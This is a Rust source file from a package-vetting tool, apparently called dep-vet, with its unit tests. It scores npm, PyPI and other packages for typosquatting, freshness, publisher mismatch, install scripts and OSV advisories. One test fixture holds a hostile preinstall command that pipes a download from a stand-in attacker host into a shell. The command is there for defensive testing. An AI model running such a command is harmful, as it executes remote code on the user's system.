//! The rule set. Every finding is a claim plus the evidence that supports it,
//! and severity only escalates when signals reinforce each other.

use crate::date;
use crate::model::Upgrade;
use crate::model::{Ecosystem, Evidence, Finding, PackageReport, Profile, Severity};
use crate::osv::{Advisory, AdvisoryList, MAX_ADVISORIES};
use crate::registry::PackageMeta;
use crate::typosquat;
use crate::version::leading_number;

/// A package younger than this has no track record.
pub const FRESH_DAYS: i64 = 7;
/// A version newer than this on a package with no history is worth a look.
pub const RECENT_VERSION_DAYS: i64 = 7;

/// A package used this widely is not an accidental typo. The seed is generated
/// and always has holes (`next` was missing once), and the alternative is
/// telling people to replace a framework with an unrelated test runner.
pub const ESTABLISHED_WEEKLY_DOWNLOADS: u64 = 1_000_000;

pub fn report(
    meta: PackageMeta,
    ecosystem: Ecosystem,
    weekly_downloads: Option<u64>,
    advisories: Option<&AdvisoryList>,
    local: &[String],
    profile: Profile,
    now: i64,
) -> PackageReport {
    let established = weekly_downloads.is_some_and(|count| count >= ESTABLISHED_WEEKLY_DOWNLOADS);
    let mut findings = assess(&meta, ecosystem, local, &profile, now);
    if established {
        findings.retain(|finding| finding.id != "typosquat");
    }
    match advisories {
        Some(list) => {
            findings.extend(advisory_findings(&list.advisories));
            if list.hidden > 0 {
                findings.push(advisories_hidden(list.hidden));
            }
        }
        None if !profile.advisories => findings.push(advisory_coverage_missing(ecosystem)),
        None => findings.push(advisory_check_unavailable()),
    }
    findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));

    let suspect = if established {
        None
    } else {
        suspect_for(&meta, ecosystem, local, &profile)
    };
    let upgrades = upgrade_advice(&meta, advisories, suspect.as_ref())
        .into_iter()
        .collect();

    // A registry that reports no publish date cannot support the freshness
    // rules; say so instead of letting silence read as "freshness checked".
    let mut not_checked = profile.not_checked();
    if profile.freshness && meta.published_at.is_none() && !not_checked.contains(&"freshness") {
        not_checked.push("freshness");
    }

    PackageReport {
        ecosystem,
        name: meta.name,
        version: meta.version,
        first_published_at: meta.first_published_at,
        published_at: meta.published_at,
        weekly_downloads: weekly_downloads.filter(|_| profile.downloads),
        maintainers: meta.maintainers,
        publisher: meta.publisher,
        install_scripts: meta.install_scripts,
        repository: meta.repository,
        deprecated: meta.deprecated,
        advisories: advisories
            .map(|list| list.advisories.clone())
            .unwrap_or_default(),
        hidden_advisories: advisories.map(|list| list.hidden).unwrap_or(0),
        not_checked,
        registry_url: meta.registry_url,
        review_url: meta.review_url,
        upgrades,
        findings,
    }
}

/// Advice is driven only by advisories and by a lookalike name. A package whose
/// findings are all install scripts, deprecation, or freshness gets nothing, so
/// the report never becomes an "out of date" nag.
fn upgrade_advice(
    meta: &PackageMeta,
    advisories: Option<&AdvisoryList>,
    suspect: Option<&typosquat::Suspect<'_>>,
) -> Option<Upgrade> {
    let mut fixed: Vec<String> = Vec::new();
    let mut fixes: Vec<String> = Vec::new();
    let mut fix_unknown = false;

    if let Some(list) = advisories {
        for advisory in &list.advisories {
            if advisory.details_missing {
                // Its fix is unknown, so it must not be attached to a version.
                fix_unknown = true;
                continue;
            }
            if advisory.fixed_versions.is_empty() {
                continue;
            }
            for version in &advisory.fixed_versions {
                if !fixed.contains(version) {
                    fixed.push(version.clone());
                }
            }
            fixes.push(advisory.id.clone());
        }
    }

    // Prefer the fix on the audited major line; keep OSV's order otherwise.
    let current = leading_number(&meta.version);
    fixed.sort_by_key(|version| (leading_number(version) != current) as u8);

    // The newest hint exists only to act on an advisory; on its own it would
    // turn every report into an "out of date" nag.
    let has_advisory = advisories.is_some_and(|list| !list.advisories.is_empty());
    let newest = meta
        .latest_version
        .clone()
        .filter(|_| has_advisory)
        .filter(|version| *version != meta.version && !fixed.contains(version));
    let replace_with = suspect.map(|suspect| suspect.candidate.to_string());

    if fixed.is_empty() && !fix_unknown && newest.is_none() && replace_with.is_none() {
        return None;
    }
    Some(Upgrade {
        fixed,
        fix_unknown,
        newest,
        fixes,
        replace_with,
    })
}

/// Accounts that publish on behalf of a project's CI, not people.
///
/// npm's trusted publishing reports `_npmUser.name` as `GitHub Actions` for
/// every release, which is not a maintainer-handoff signal.
const AUTOMATION_PUBLISHERS: &[&str] = &[
    "github actions",
    "npm",
    "npm-cli",
    "npm cli",
    "gitlab ci",
    "circleci",
    "travis ci",
    "azure pipelines",
    "jenkins",
    "semantic-release-bot",
];

pub fn is_automation_publisher(publisher: &str) -> bool {
    let normalized = publisher.trim().to_ascii_lowercase();
    normalized.ends_with("[bot]") || AUTOMATION_PUBLISHERS.contains(&normalized.as_str())
}

/// One finding per advisory, each linking to its OSV record.
pub fn advisory_findings(advisories: &[Advisory]) -> Vec<Finding> {
    advisories
        .iter()
        .map(|advisory| {
            let mut evidence = vec![Evidence {
                label: "advisory".to_string(),
                value: advisory.id.clone(),
                url: Some(advisory.url.clone()),
            }];
            if !advisory.aliases.is_empty() {
                evidence.push(Evidence {
                    label: "also known as".to_string(),
                    value: advisory.aliases.join(", "),
                    url: None,
                });
            }
            Finding {
                id: "advisory",
                severity: advisory.severity,
                title: advisory.display_title(),
                detail: advisory.summary.clone(),
                allowed: false,
                evidence,
            }
        })
        .collect()
}

fn advisory_coverage_missing(ecosystem: Ecosystem) -> Finding {
    Finding {
        id: "advisory-check-unavailable",
        severity: Severity::Info,
        title: "advisory coverage unavailable".to_string(),
        detail: format!(
            "OSV does not publish advisories for {ecosystem}; this report covers metadata only"
        ),
        allowed: false,
        evidence: vec![Evidence {
            label: "OSV ecosystems".to_string(),
            value: "https://osv.dev/#use".to_string(),
            url: Some("https://osv.dev/#use".to_string()),
        }],
    }
}

/// OSV's Maven data is built from Maven Central. A Google Maven artifact is
/// not indexed there, so a clean result may be missing advisories.
pub fn advisory_coverage_partial() -> Finding {
    Finding {
        id: "advisory-coverage-partial",
        severity: Severity::Info,
        title: "advisory coverage may be incomplete".to_string(),
        detail: "this package comes from Google Maven, which OSV does not index; \
                 advisories filed only against Google Maven may be missing"
            .to_string(),
        allowed: false,
        evidence: vec![Evidence {
            label: "OSV ecosystems".to_string(),
            value: "https://osv.dev/#use".to_string(),
            url: Some("https://osv.dev/#use".to_string()),
        }],
    }
}

/// The per-run cap dropped advisories; the report must not look complete.
pub fn advisories_hidden(hidden: usize) -> Finding {
    Finding {
        id: "advisories-truncated",
        severity: Severity::Info,
        title: "more advisories not shown".to_string(),
        detail: if hidden == 1 {
            format!(
                "1 additional advisory was not fetched; dep-vet shows at most {MAX_ADVISORIES} per package. Review OSV before installing"
            )
        } else {
            format!(
                "{hidden} additional advisories were not fetched; dep-vet shows at most {MAX_ADVISORIES} per package. Review OSV before installing"
            )
        },
        allowed: false,
        evidence: vec![Evidence {
            label: "OSV".to_string(),
            value: "https://osv.dev".to_string(),
            url: Some("https://osv.dev".to_string()),
        }],
    }
}

/// OSV unreachable: say so instead of implying the package is advisory-free.
pub fn advisory_check_unavailable() -> Finding {
    Finding {
        id: "advisory-check-unavailable",
        severity: Severity::Info,
        title: "advisory check unavailable".to_string(),
        detail: "OSV could not be reached, so this report says nothing about known vulnerabilities"
            .to_string(),
        allowed: false,
        evidence: vec![Evidence {
            label: "OSV".to_string(),
            value: "https://osv.dev".to_string(),
            url: Some("https://osv.dev".to_string()),
        }],
    }
}

/// The nearest popular name, when typosquatting is enabled. Called by `assess`
/// for the finding and by `report` for the replacement advice.
fn suspect_for<'a>(
    meta: &PackageMeta,
    ecosystem: Ecosystem,
    local: &'a [String],
    profile: &Profile,
) -> Option<typosquat::Suspect<'a>> {
    if !profile.typosquat {
        return None;
    }
    let seed = match ecosystem {
        Ecosystem::Npm => typosquat::popular_npm(),
        Ecosystem::Pypi => typosquat::POPULAR_PYPI,
        Ecosystem::CratesIo => typosquat::POPULAR_CRATES,
        Ecosystem::Go => typosquat::POPULAR_GO,
        Ecosystem::Jsr => typosquat::POPULAR_JSR,
        Ecosystem::RubyGems => typosquat::POPULAR_RUBYGEMS,
        Ecosystem::NuGet => typosquat::POPULAR_NUGET,
        Ecosystem::Maven => typosquat::POPULAR_MAVEN,
        Ecosystem::Composer => typosquat::POPULAR_COMPOSER,
    };
    typosquat::closest(&meta.name, seed, local)
}

pub fn assess(
    meta: &PackageMeta,
    ecosystem: Ecosystem,
    local: &[String],
    profile: &Profile,
    now: i64,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    let suspect = suspect_for(meta, ecosystem, local, profile);
    let typosquat_high = match suspect {
        Some(suspect) => {
            let high = suspect.homoglyph || suspect.distance <= 1;
            let reference = if suspect.local {
                format!("'{}', which is already in your lockfile", suspect.candidate)
            } else {
                format!("the popular package '{}'", suspect.candidate)
            };
            let detail = if suspect.homoglyph {
                format!("'{}' uses lookalike characters for {reference}", meta.name)
            } else {
                format!(
                    "'{}' is {} edit(s) away from {reference}",
                    meta.name, suspect.distance
                )
            };
            findings.push(Finding {
                id: "typosquat",
                severity: if high { Severity::High } else { Severity::Warn },
                title: if suspect.local {
                    "name is close to a package you already use".to_string()
                } else {
                    "name is close to a popular package".to_string()
                },
                detail,
                allowed: false,
                evidence: vec![
                    Evidence {
                        label: "this package".to_string(),
                        value: meta.name.clone(),
                        url: Some(ecosystem.package_url(&meta.name, &meta.version)),
                    },
                    Evidence {
                        label: if suspect.local {
                            "already installed".to_string()
                        } else {
                            "popular package".to_string()
                        },
                        value: suspect.candidate.to_string(),
                        url: Some(ecosystem.project_url(suspect.candidate)),
                    },
                ],
            });
            high
        }
        None => false,
    };

    let package_age = meta
        .first_published_at
        .map(|created| date::days_between(created, now));
    let fresh =
        profile.freshness && package_age.is_some_and(|days| (0..FRESH_DAYS).contains(&days));
    if profile.freshness
        && let Some(days) = package_age.filter(|days| (0..FRESH_DAYS).contains(days))
    {
        findings.push(Finding {
            id: "fresh-package",
            severity: Severity::Warn,
            title: "package is new".to_string(),
            detail: format!(
                "first published {days} day(s) ago; there is no track record to review"
            ),
            allowed: false,
            evidence: vec![Evidence {
                label: "first publish".to_string(),
                value: meta
                    .first_published_at
                    .map(date::format_date)
                    .unwrap_or_default(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    let version_recent =
        meta.first_published_at
            .zip(meta.published_at)
            .is_some_and(|(created, published)| {
                let package_age = date::days_between(created, now);
                let version_age = date::days_between(published, now);
                package_age >= FRESH_DAYS && (0..RECENT_VERSION_DAYS).contains(&version_age)
            });
    if version_recent {
        findings.push(Finding {
            id: "fresh-version",
            severity: Severity::Info,
            title: "this version is recent".to_string(),
            detail:
                "the package has history, but this exact version was published in the last week"
                    .to_string(),
            allowed: false,
            evidence: vec![Evidence {
                label: "version publish".to_string(),
                value: meta.published_at.map(date::format_date).unwrap_or_default(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    if profile.maintainers && !meta.maintainers_known {
        findings.push(Finding {
            id: "maintainer-check-unavailable",
            severity: Severity::Info,
            title: "maintainer list unavailable".to_string(),
            detail: "the registry did not return an owner list, so publisher and maintainer agreement could not be checked"
                .to_string(),
            allowed: false,
            evidence: vec![Evidence {
                label: "registry metadata".to_string(),
                value: meta.name.clone(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    // Team owners (crates.io `github:org:team`) hide their members, so a
    // publisher outside the user list cannot be judged.
    let team_owned = meta.maintainers.iter().any(|name| name.contains(':'));
    let publisher_mismatch = profile.maintainers
        && !team_owned
        && match (&meta.publisher, meta.maintainers.is_empty()) {
            (Some(publisher), false) => {
                !is_automation_publisher(publisher)
                    && !meta
                        .maintainers
                        .iter()
                        .any(|maintainer| maintainer.eq_ignore_ascii_case(publisher))
            }
            _ => false,
        };
    if let (true, Some(publisher)) = (publisher_mismatch, &meta.publisher) {
        findings.push(Finding {
            id: "publisher-not-maintainer",
            // crates.io owners are users, not org members, so an org-published
            // crate looks mismatched even when nothing changed.
            severity: if ecosystem == Ecosystem::CratesIo {
                Severity::Info
            } else {
                Severity::Warn
            },
            title: "published by a user who is not a maintainer".to_string(),
            detail: format!(
                "this version was published by '{publisher}', who is not in the current maintainer list [{}]",
                meta.maintainers.join(", ")
            ),
            allowed: false,
            evidence: vec![Evidence {
                label: "maintainers".to_string(),
                value: meta.maintainers.join(", "),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    if ecosystem == Ecosystem::Npm && !meta.install_scripts.is_empty() {
        let compounded = fresh || publisher_mismatch || typosquat_high;
        let mut evidence: Vec<Evidence> = meta
            .install_scripts
            .iter()
            .map(|script| Evidence {
                label: script.name.clone(),
                value: script.command.clone(),
                url: Some(meta.registry_url.clone()),
            })
            .collect();
        evidence.push(Evidence {
            label: "why install scripts matter".to_string(),
            value: "they run with your user's permissions during npm install".to_string(),
            url: Some(
                "https://docs.npmjs.com/cli/configuring-npm/package-json#scripts".to_string(),
            ),
        });
        findings.push(Finding {
            id: "install-scripts",
            severity: if compounded {
                Severity::High
            } else {
                Severity::Warn
            },
            title: "runs code during npm install".to_string(),
            detail: if compounded {
                "install-time scripts plus another warning signal; this is the shape of a supply-chain attack"
                    .to_string()
            } else {
                "install-time scripts are legitimate for native builds, but they are also how malicious packages run code before you review anything"
                    .to_string()
            },
            allowed: false,
            evidence,
        });
    }

    if ecosystem == Ecosystem::Pypi && meta.build_from_source && profile.execution {
        findings.push(Finding {
            id: "build-from-source",
            severity: Severity::Warn,
            title: "installs by building from source".to_string(),
            detail: "no wheel is published for this version, so pip runs the project's build backend, which executes code with your permissions during install"
                .to_string(),
            allowed: false,
            evidence: vec![
                Evidence {
                    label: "files for this version".to_string(),
                    value: "sdist only".to_string(),
                    url: Some(meta.registry_url.clone()),
                },
                Evidence {
                    label: "why this matters".to_string(),
                    value: "PEP 517 build backends run arbitrary code".to_string(),
                    url: Some("https://peps.python.org/pep-0517/".to_string()),
                },
            ],
        });
    }

    if profile.deprecation
        && let Some(message) = &meta.deprecated
    {
        findings.push(Finding {
            id: "deprecated",
            severity: Severity::Warn,
            title: "version is deprecated".to_string(),
            detail: message.clone(),
            allowed: false,
            evidence: vec![Evidence {
                label: "registry deprecation notice".to_string(),
                value: message.clone(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    if profile.repository && meta.repository.is_none() {
        findings.push(Finding {
            id: "no-repository",
            severity: Severity::Info,
            title: "no repository on record".to_string(),
            detail: "the publisher did not declare a source repository, so the tarball cannot be traced to source"
                .to_string(),
            allowed: false,
            evidence: vec![Evidence {
                label: "package metadata".to_string(),
                value: meta.name.clone(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::InstallScript;
    use crate::osv::{Advisory, AdvisoryList};

    const NOW: i64 = 1_800_000_000; // 2027-01-15

    fn meta() -> PackageMeta {
        PackageMeta {
            name: "some-package".to_string(),
            version: "1.0.0".to_string(),
            first_published_at: Some(NOW - 400 * date::SECONDS_PER_DAY),
            published_at: Some(NOW - 100 * date::SECONDS_PER_DAY),
            maintainers: vec!["alice".to_string()],
            publisher: Some("alice".to_string()),
            install_scripts: vec![],
            build_from_source: false,
            maintainers_known: true,
            repository: Some("https://github.com/alice/some-package".to_string()),
            deprecated: None,
            registry_url: "https://registry.npmjs.org/some-package".to_string(),
            review_url: None,
            latest_version: None,
            release: crate::registry::ReleaseHistory::default(),
        }
    }

    fn ids(findings: &[Finding]) -> Vec<&'static str> {
        findings.iter().map(|finding| finding.id).collect()
    }

    fn finding<'a>(findings: &'a [Finding], id: &str) -> &'a Finding {
        findings
            .iter()
            .find(|finding| finding.id == id)
            .unwrap_or_else(|| panic!("missing finding {id}"))
    }

    fn fixed_advisory(id: &str, fixed: &[&str]) -> Advisory {
        Advisory {
            id: id.to_string(),
            summary: "a real vulnerability".to_string(),
            severity: Severity::High,
            aliases: Vec::new(),
            url: format!("https://osv.dev/vulnerability/{id}"),
            fixed_versions: fixed.iter().map(|version| version.to_string()).collect(),
            details_missing: false,
        }
    }

    fn advice_report(meta: PackageMeta, advisories: Option<&AdvisoryList>) -> PackageReport {
        super::report(
            meta,
            Ecosystem::Npm,
            None,
            advisories,
            &[],
            Profile::NPM,
            NOW,
        )
    }

    #[test]
    fn advisory_advice_prefers_the_fixed_version_on_the_audited_major() {
        let mut meta = meta();
        meta.version = "2.1.0".to_string();
        meta.latest_version = Some("3.0.0".to_string());
        let list = AdvisoryList {
            advisories: vec![fixed_advisory("GHSA-a", &["1.2.3", "2.0.1"])],
            hidden: 0,
        };

        let report = advice_report(meta, Some(&list));
        let upgrade = &report.upgrades[0];
        assert_eq!(
            upgrade.fixed,
            vec!["2.0.1".to_string(), "1.2.3".to_string()]
        );
        assert_eq!(upgrade.newest.as_deref(), Some("3.0.0"));
        assert_eq!(upgrade.fixes, vec!["GHSA-a".to_string()]);
        assert!(!upgrade.fix_unknown);
    }

    #[test]
    fn no_fix_published_is_not_unknown() {
        let mut meta = meta();
        meta.latest_version = Some("2.0.0".to_string());
        let list = AdvisoryList {
            advisories: vec![fixed_advisory("GHSA-a", &[])],
            hidden: 0,
        };

        let report = advice_report(meta, Some(&list));
        let upgrade = &report.upgrades[0];
        assert!(upgrade.fixed.is_empty());
        assert!(!upgrade.fix_unknown);
        assert_eq!(upgrade.newest.as_deref(), Some("2.0.0"));
    }

    #[test]
    fn an_unhydrated_advisory_is_unknown_not_unfixed() {
        let list = AdvisoryList {
            advisories: vec![Advisory {
                id: "GHSA-x".to_string(),
                summary: "OSV did not return details for this advisory".to_string(),
                severity: Severity::Warn,
                aliases: Vec::new(),
                url: "https://osv.dev/vulnerability/GHSA-x".to_string(),
                fixed_versions: Vec::new(),
                details_missing: true,
            }],
            hidden: 0,
        };

        let report = advice_report(meta(), Some(&list));
        let upgrade = &report.upgrades[0];
        assert!(upgrade.fix_unknown);
        assert!(upgrade.fixed.is_empty());
    }

    #[test]
    fn a_mixed_unknown_advisory_is_not_listed_as_fixed() {
        let list = AdvisoryList {
            advisories: vec![
                fixed_advisory("GHSA-fixed", &["2.0.1"]),
                Advisory {
                    id: "GHSA-unknown".to_string(),
                    summary: "OSV did not return details for this advisory".to_string(),
                    severity: Severity::Warn,
                    aliases: Vec::new(),
                    url: "https://osv.dev/vulnerability/GHSA-unknown".to_string(),
                    fixed_versions: Vec::new(),
                    details_missing: true,
                },
            ],
            hidden: 0,
        };

        let report = advice_report(meta(), Some(&list));
        let upgrade = &report.upgrades[0];
        assert_eq!(upgrade.fixed, vec!["2.0.1".to_string()]);
        assert!(upgrade.fix_unknown);
        assert_eq!(upgrade.fixes, vec!["GHSA-fixed".to_string()]);
    }

    #[test]
    fn newest_equal_to_the_audited_version_is_dropped() {
        let mut meta = meta();
        meta.latest_version = Some(meta.version.clone());
        let list = AdvisoryList {
            advisories: vec![fixed_advisory("GHSA-a", &["2.0.0"])],
            hidden: 0,
        };

        let report = advice_report(meta, Some(&list));
        assert_eq!(report.upgrades[0].newest, None);
    }

    #[test]
    fn an_established_package_is_never_a_typosquat() {
        let mut meta = meta();
        meta.name = "next".to_string();

        let report = super::report(
            meta,
            Ecosystem::Npm,
            Some(98_000_000),
            Some(&AdvisoryList::default()),
            &[],
            Profile::NPM,
            NOW,
        );

        assert!(
            report
                .findings
                .iter()
                .all(|finding| finding.id != "typosquat"),
            "next must not look like a typo: {:?}",
            report.findings
        );
        assert!(report.upgrades.is_empty(), "{:?}", report.upgrades);
    }

    #[test]
    fn a_low_download_lookalike_is_still_flagged() {
        let mut meta = meta();
        meta.name = "crossenv".to_string();

        let report = super::report(
            meta,
            Ecosystem::Npm,
            Some(1_200),
            Some(&AdvisoryList::default()),
            &[],
            Profile::NPM,
            NOW,
        );

        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.id == "typosquat")
        );
        assert_eq!(
            report.upgrades[0].replace_with.as_deref(),
            Some("cross-env")
        );
    }

    #[test]
    fn install_scripts_alone_produce_no_advice() {
        let mut meta = meta();
        meta.latest_version = Some("9.9.9".to_string());
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });

        let report = advice_report(meta, Some(&AdvisoryList::default()));
        assert!(report.upgrades.is_empty());
    }

    #[test]
    fn a_typosquat_suggests_the_real_package_and_no_version() {
        let mut meta = meta();
        meta.name = "crossenv".to_string();

        let report = advice_report(meta, None);
        let upgrade = &report.upgrades[0];
        assert_eq!(upgrade.replace_with.as_deref(), Some("cross-env"));
        assert!(upgrade.fixed.is_empty());
        assert_eq!(upgrade.newest, None);
    }

    #[test]
    fn a_typosquat_with_an_advisory_keeps_both_facts() {
        let mut meta = meta();
        meta.name = "crossenv".to_string();
        let list = AdvisoryList {
            advisories: vec![fixed_advisory("GHSA-a", &["2.0.0"])],
            hidden: 0,
        };

        let report = advice_report(meta, Some(&list));
        let upgrade = &report.upgrades[0];
        assert_eq!(upgrade.replace_with.as_deref(), Some("cross-env"));
        assert_eq!(upgrade.fixed, vec!["2.0.0".to_string()]);
    }

    #[test]
    fn an_old_plain_package_is_clean() {
        let findings = assess(&meta(), Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert!(findings.is_empty(), "unexpected findings: {findings:?}");
    }

    #[test]
    fn install_scripts_alone_are_a_warning() {
        let mut meta = meta();
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(ids(&findings), vec!["install-scripts"]);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::Warn
        );
    }

    #[test]
    fn install_scripts_on_a_fresh_package_are_high_risk() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
        assert_eq!(
            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
            2,
            "install script + freshness should exit 2"
        );
    }

    #[test]
    fn install_scripts_with_a_publisher_mismatch_are_high_risk() {
        let mut meta = meta();
        meta.publisher = Some("mallory".to_string());
        meta.install_scripts.push(InstallScript {
            name: "preinstall".to_string(),
            command: "curl http://evil.test | sh".to_string(),
        });
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
    }

    #[test]
    fn install_scripts_with_a_typosquat_name_are_high_risk() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        meta.install_scripts.push(InstallScript {
            name: "install".to_string(),
            command: "node index.js".to_string(),
        });
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
        assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
    }

    #[test]
    fn a_profile_can_switch_a_signal_off_and_say_so() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        let partial = Profile {
            typosquat: false,
            ..Profile::NPM
        };
        let findings = assess(&meta, Ecosystem::Npm, &[], &partial, NOW);
        assert!(!findings.iter().any(|finding| finding.id == "typosquat"));

        let report = report(meta, Ecosystem::Npm, None, None, &[], partial, NOW);
        assert_eq!(report.not_checked, vec!["typosquat"]);
    }

    #[test]
    fn go_reports_its_missing_signals_and_suppresses_repository_noise() {
        let report = report(meta(), Ecosystem::Go, None, None, &[], Profile::GO, NOW);
        assert_eq!(
            report.not_checked,
            vec!["execution", "maintainers", "repository", "downloads"]
        );
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.id == "no-repository")
        );
    }

    #[test]
    fn go_typosquat_uses_the_module_seed() {
        let mut meta = meta();
        meta.name = "github.com/gin-gonic/gln".to_string();
        let findings = assess(&meta, Ecosystem::Go, &[], &Profile::GO, NOW);
        let finding = finding(&findings, "typosquat");
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.detail.contains("github.com/gin-gonic/gin"));
    }

    #[test]
    fn an_unknown_maintainer_list_is_reported_not_ignored() {
        let mut meta = meta();
        meta.maintainers_known = false;
        meta.maintainers.clear();
        meta.publisher = None;
        let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
        let finding = finding(&findings, "maintainer-check-unavailable");
        assert_eq!(finding.severity, Severity::Info);
    }

    #[test]
    fn an_sdist_only_pypi_release_is_a_build_warning() {
        let mut meta = meta();
        meta.build_from_source = true;
        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
        let finding = finding(&findings, "build-from-source");
        assert_eq!(finding.severity, Severity::Warn);
        assert!(finding.detail.contains("build backend"));
        assert_eq!(
            report(meta, Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW).exit_code(),
            1
        );
    }

    #[test]
    fn pypi_reports_its_missing_signals() {
        let report = report(meta(), Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW);
        assert_eq!(report.not_checked, vec!["maintainers", "downloads"]);
        assert_eq!(report.ecosystem, Ecosystem::Pypi);
    }

    #[test]
    fn pypi_typosquat_uses_the_pypi_seed() {
        let mut meta = meta();
        meta.name = "request".to_string();
        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
        let finding = finding(&findings, "typosquat");
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.detail.contains("requests"));
    }

    #[test]
    fn npm_names_are_not_flagged_against_the_pypi_seed() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
        assert!(!findings.iter().any(|finding| finding.id == "typosquat"));
    }

    #[test]
    fn a_typosquat_of_a_local_dependency_is_high_risk() {
        let mut meta = meta();
        meta.name = "crossenv".to_string();
        let local = vec!["cross-env".to_string()];
        let findings = assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW);
        let finding = finding(&findings, "typosquat");
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.detail.contains("already in your lockfile"));
        assert_eq!(finding.evidence[1].label, "already installed");
    }

    #[test]
    fn a_known_package_is_not_flagged_against_a_similar_local_one() {
        let mut meta = meta();
        meta.name = "preact".to_string();
        let local = vec!["react".to_string()];
        assert!(assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn a_new_package_is_a_warning() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(ids(&findings), vec!["fresh-package"]);
        assert_eq!(finding(&findings, "fresh-package").severity, Severity::Warn);
    }

    #[test]
    fn a_package_exactly_seven_days_old_is_not_fresh() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - FRESH_DAYS * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn a_recent_version_on_an_old_package_is_only_info() {
        let mut meta = meta();
        meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(ids(&findings), vec!["fresh-version"]);
        assert_eq!(finding(&findings, "fresh-version").severity, Severity::Info);
    }

    #[test]
    fn future_timestamps_do_not_panic_or_alert() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn publisher_not_in_maintainers_is_a_warning() {
        let mut meta = meta();
        meta.publisher = Some("mallory".to_string());
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(ids(&findings), vec!["publisher-not-maintainer"]);
        assert!(
            finding(&findings, "publisher-not-maintainer")
                .detail
                .contains("mallory")
        );
    }

    #[test]
    fn crates_publisher_mismatch_is_information_only() {
        let mut meta = meta();
        meta.maintainers = vec!["rust-lang-owner".to_string()];
        meta.publisher = Some("BurntSushi".to_string());
        let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
        let finding = finding(&findings, "publisher-not-maintainer");
        assert_eq!(finding.severity, Severity::Info);
    }

    #[test]
    fn team_owned_packages_do_not_judge_the_publisher() {
        let mut meta = meta();
        meta.maintainers = vec![
            "Manishearth".to_string(),
            "github:unicode-org:icu4x-release".to_string(),
        ];
        meta.publisher = Some("robertbastian".to_string());
        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn maintainer_matching_is_case_insensitive() {
        let mut meta = meta();
        meta.publisher = Some("Alice".to_string());
        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn an_empty_maintainer_list_does_not_trigger_a_mismatch() {
        let mut meta = meta();
        meta.maintainers.clear();
        meta.publisher = Some("mallory".to_string());
        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
    }

    #[test]
    fn ci_publishers_are_not_maintainer_mismatches() {
        // Real npm data: express@5.3.0 is published through trusted publishing
        // and reports "_npmUser": "GitHub Actions".
        for publisher in [
            "GitHub Actions",
            "github actions",
            "npm",
            "npm-cli",
            "GitLab CI",
            "CircleCI",
            "Travis CI",
            "Azure Pipelines",
            "dependabot[bot]",
        ] {
            let mut meta = meta();
            meta.publisher = Some(publisher.to_string());
            assert!(
                assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty(),
